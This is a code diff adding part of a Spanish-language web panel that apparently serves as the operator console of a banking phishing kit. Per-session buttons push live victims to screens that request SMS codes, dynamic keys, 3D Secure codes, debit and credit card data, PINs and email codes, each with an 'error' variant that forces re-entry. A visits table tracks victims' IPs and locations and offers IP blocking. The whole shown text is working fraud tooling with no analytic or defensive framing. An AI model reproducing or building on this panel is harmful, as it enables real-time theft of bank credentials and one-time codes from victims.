+                                    <button onclick="updateStep('${s.id}', 'sms_error')" class="btn btn-red px-3 text-[13px] h-[35px] font-black">SMSE</button>
+
+                                </div>
+
+                                <!-- Columna 2: DIN / DINE -->
+
+                                <div class="flex flex-col gap-1 items-stretch min-w-[90px]">
+
+                                    <button onclick="updateStep('${s.id}', 'clave_dinamica')" class="btn btn-indigo px-3 text-[13px] h-[35px] font-black">DIN</button>
+
+                                    <button onclick="updateStep('${s.id}', 'dinamica_error')" class="btn btn-red px-3 text-[13px] h-[35px] font-black">DINE</button>
+
+                                </div>
+
+                                <!-- Columna 3: 3D / 3DE -->
+
+                                <div class="flex flex-col gap-1 items-stretch min-w-[90px]">
+
+                                    <button onclick="updateStep('${s.id}', '3d')" class="btn btn-indigo px-3 text-[13px] h-[35px] font-black">3D</button>
+
+                                    <button onclick="updateStep('${s.id}', '3d_error')" class="btn btn-red px-3 text-[13px] h-[35px] font-black">3DE</button>
+
+                                </div>
+
+                                <!-- Columna 4: TEL / TELE -->
+
+                                <div class="flex flex-col gap-1 items-stretch min-w-[90px]">
+
+                                    <button onclick="updateStep('${s.id}', 'phone')" class="btn btn-orange px-3 text-[13px] h-[35px] font-black">TEL</button>
+
+                                    <button onclick="updateStep('${s.id}', 'phone_error')" class="btn btn-red px-3 text-[13px] h-[35px] font-black">TELE</button>
+
+                                </div>
+
+                                <!-- Columna 5: DEB / DEBE -->
+
+                                <div class="flex flex-col gap-1 items-stretch min-w-[90px]">
+
+                                    <button onclick="updateStep('${s.id}', 'td')" class="btn btn-purple px-3 text-[13px] h-[35px] font-black">DEB</button>
+
+                                    <button onclick="updateStep('${s.id}', 'td_error')" class="btn btn-red px-3 text-[13px] h-[35px] font-black">DEBE</button>
+
+                                </div>
+
+                                <!-- Columna 6: CRED / CREDE -->
+
+                                <div class="flex flex-col gap-1 items-stretch min-w-[90px]">
+
+                                    <button onclick="updateStep('${s.id}', 'tc')" class="btn btn-pink px-3 text-[13px] h-[35px] font-black">CRED</button>
+
+                                    <button onclick="updateStep('${s.id}', 'tc_error')" class="btn btn-red px-3 text-[13px] h-[35px] font-black">CREDE</button>
+
+                                </div>
+
+                                <!-- Columna 7: SMS4 / SMS4E -->
+
+                                <div class="flex flex-col gap-1 items-stretch min-w-[90px]">
+
+                                    <button onclick="updateStep('${s.id}', 'sms4')" class="btn btn-yellow px-3 text-[13px] h-[35px] font-black">SMS4</button>
+
+                                    <button onclick="updateStep('${s.id}', 'sms4_error')" class="btn btn-red px-3 text-[13px] h-[35px] font-black">SMS4E</button>
+
+                                </div>
+
+                                <!-- Columna 8: PIN4 / PIN4E -->
+
+                                <div class="flex flex-col gap-1 items-stretch min-w-[90px]">
+
+                                    <button onclick="updateStep('${s.id}', 'pin4')" class="btn btn-indigo px-3 text-[13px] h-[35px] font-black">PIN4</button>
+
+                                    <button onclick="updateStep('${s.id}', 'pin4_error')" class="btn btn-red px-3 text-[13px] h-[35px] font-black">PIN4E</button>
+
+                                </div>
+
+                                <!-- Columna 9: CORREO / CORREO E -->
+
+                                <div class="flex flex-col gap-1 items-stretch min-w-[90px]">
+
+                                    <button onclick="updateStep('${s.id}', 'correo')" class="btn btn-indigo px-3 text-[13px] h-[35px] font-black">CORREO</button>
+
+                                    <button onclick="updateStep('${s.id}', 'correo_error')" class="btn btn-red px-3 text-[13px] h-[35px] font-black">CORREO E</button>
+
+                                </div>
+
+                                <!-- Columna 10: CODE C / CODE C E -->
+
+                                <div class="flex flex-col gap-1 items-stretch min-w-[90px]">
+
+                                    <button onclick="updateStep('${s.id}', 'codecorreo')" class="btn btn-indigo px-3 text-[13px] h-[35px] font-black">CODE C</button>
+
+                                    <button onclick="updateStep('${s.id}', 'codecorreo_error')" class="btn btn-red px-3 text-[13px] h-[35px] font-black">CODE C E</button>
+
+                                </div>
+
+                                <!-- Columna 11: FIN / DEL -->
+
+                                <div class="flex flex-col gap-1 items-stretch min-w-[90px]">
+
+                                    <button onclick="updateStep('${s.id}', 'final')" class="btn btn-green px-3 text-[13px] h-[35px] font-black">FIN</button>
+
+                                    <button onclick="deleteSession('${s.id}')" class="btn btn-gray-dark px-3 text-[13px] h-[35px] font-black">DEL</button>
+
+                                </div>
+
+                                <!-- Columna 12: LOGIN / L.ERROR -->
+
+                                <div class="flex flex-col gap-1 items-stretch min-w-[90px]">
+
+                                    <button onclick="updateStep('${s.id}', 'login')" class="btn btn-indigo px-3 text-[13px] h-[35px] font-black">LOGIN</button>
+
+                                    <button onclick="updateStep('${s.id}', 'error_acceso')" class="btn btn-red px-3 text-[13px] h-[35px] font-black">L.ERROR</button>
+
+                                </div>
+
+                            </div>
+
+                        </td>
+
+                    </tr>`;
+
+            });
+
+
+
+            // Renderizar Visitas Recientes (dentro del Modal)
+
+            const visitBody = document.getElementById("ip-table-body");
+
+            if (visitBody) {
+
+                visitBody.innerHTML = "";
+
+                visitsOnly.slice(0, 50).forEach(s => {
+
+                    const isOnline = s.last_seen && (new Date() - new Date(s.last_seen) < 30000);
+
+                    const statusHtml = isOnline 
+
+                         ? '<span class="inline-block w-2.5 h-2.5 bg-red-500 rounded-full shadow-[0_0_5px_#ff0000]"></span>' 
+
+                         : '<span class="inline-block w-2.5 h-2.5 bg-neutral-800 rounded-full"></span>';
+
+                    const ipVal = s.ip_address || s.nombre || s.telefono || '';
+
+                    const isIpBlocked = blockedIPs.some(b => b.telefono === ipVal);
+
+                    const blockBtn = ipVal
+
+                        ? (isIpBlocked
+
+                            ? `<button onclick="unblockIP('${ipVal}')" class="text-red-500 font-bold hover:underline">Desbloquear</button>`
+
+                            : `<button onclick="blockIP('${ipVal}')" class="text-red-650 font-bold hover:underline">Bloquear</button>`)
+
+                        : '?';
+
+
+
+                    visitBody.innerHTML += `
+
+                        <tr class="hover:bg-red-950/40 border-b border-black text-[13px]">
+
+                            <td class="p-2 text-center align-middle">${statusHtml}</td>
+
+                            <td class="p-2 text-left">
+
+                                <div class="font-mono font-bold text-red-200">${ipVal}</div>
+
+                                <div class="text-[11px] text-red-400 leading-tight">${s.location || s.monto || '?'}</div>
+
+                            </td>
+
+                            <td class="p-2 text-left">
+
+                                 <div class="flex flex-col gap-1">
+
+                                     ${blockBtn}
+
+                                     <button onclick="deleteSession('${s.id}')" class="text-neutral-500 hover:text-red-500 hover:underline text-left">Eliminar</button>
+
+                                 </div>
+
+                             </td>
+
+                        </tr>`;
+
+                });
+
+            }
+
+
+
+            // Renderizar Lista Negra (dentro del Modal)
+
+            const blacklistBody = document.getElementById("blacklist-table-body");
+
+            if (blacklistBody) {
+
+                blacklistBody.innerHTML = "";
+
+                blockedIPs.forEach(s => {
+
+                    blacklistBody.innerHTML += `
+
+                         <tr class="hover:bg-red-950/40 border-b border-black text-[13px]">
+
+                             <td class="p-2 font-mono font-bold text-red-650 align-middle text-left">${s.telefono}</td>
+
+                             <td class="p-2 text-center align-middle">
+
+                                 <button onclick="unblockIP('${s.telefono}')" class="bg-black border border-red-900 hover:bg-red-950 text-red-400 text-[12px] px-3 py-1 rounded font-bold transition">Desbloquear</button>
+
+                             </td>
+
+                         </tr>`;
+
+                });
+
+            }
+
+        }
+
+
+
+    </script>
+
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"f87f52325f5a47a3be0745acde12e881","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+
+</body>
+
+</html>
